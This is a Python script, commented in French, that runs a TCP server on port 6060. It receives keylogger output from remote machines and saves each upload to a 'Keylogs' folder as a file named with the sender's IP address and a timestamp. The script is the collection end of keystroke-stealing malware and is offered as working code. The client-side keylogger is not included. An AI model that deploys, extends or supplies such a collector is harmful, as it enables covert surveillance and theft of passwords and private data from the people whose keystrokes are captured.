import socket
import os
from datetime import datetime


def receive_file(filename, client_socket, destination_folder):
    full_path = os.path.join(destination_folder, filename)
    with open(full_path, 'wb') as file:
        while True:
            keylog = client_socket.recv(1024)
            if not keylog  :
                break
            file.write(keylog)

server_port = 6060  
save_folder = "Keylogs"  

# Création du répertoire de sauvegarde
if not os.path.exists(save_folder):
    os.makedirs(save_folder)

# Création d'un socket serveur
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    # Liaison du socket à l'adresse et au port souhaité
    server_socket.bind(('', server_port))

    # Écoute des connexions entrantes
    server_socket.listen(5)
    print("Le serveur est prêt à écouter les connexions entrantes.")

    try:
        while True:
            # Attente d'une connexion entrante
            client_socket, client_address = server_socket.accept()
            
            # IP du client
            client_ip = client_address[0]

            # Heure actuelle
            heure_actuelle = datetime.now()
            # Formatage de l'heure actuelle
            heure_formattee = heure_actuelle.strftime("%Y-%m-%d_%H-%M-%S")
            # Remplacement des caractères non valides dans le nom du fichier
            heure_formattee = heure_formattee.replace(":", "-").replace(" ", "/")

            print("Nouvelle connexion entrante:", client_address)

            # Réception du fichier envoyé par le client
            filename = f"{client_ip}-{heure_formattee}-keyboard.txt"
            receive_file(filename, client_socket, save_folder)

            print("Fichier reçu et enregistré avec succès:", filename)

    except KeyboardInterrupt:
        print("Arrêt du serveur.")
